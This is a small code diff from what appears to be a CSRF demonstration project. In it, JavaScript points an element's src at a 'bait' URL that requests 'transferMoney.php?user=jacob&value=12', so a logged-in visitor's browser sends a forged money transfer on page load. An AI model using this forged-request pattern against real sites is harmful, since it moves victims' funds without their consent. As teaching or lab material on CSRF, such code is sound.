@@ -21,9 +21,9 @@ function showUser(){
         $("#loggedUser").text(getCookie("user"));
     }
 
-    //let root = document.location.hostname ;
-    let bait = "transferMoney.php?user=jacob&value=11";
-    let link = "/beti-csrf/"+bait;
-    //console.log(link);
-    $("#link").attr("src", link);
+    //let root = "floating-ravine-68691.herokuapp.com" ;
+    let bait = "transferMoney.php?user=jacob&value=12";
+    //let link = root+bait;
+    console.log(bait);
+    $("#link").attr("src", bait);
 }
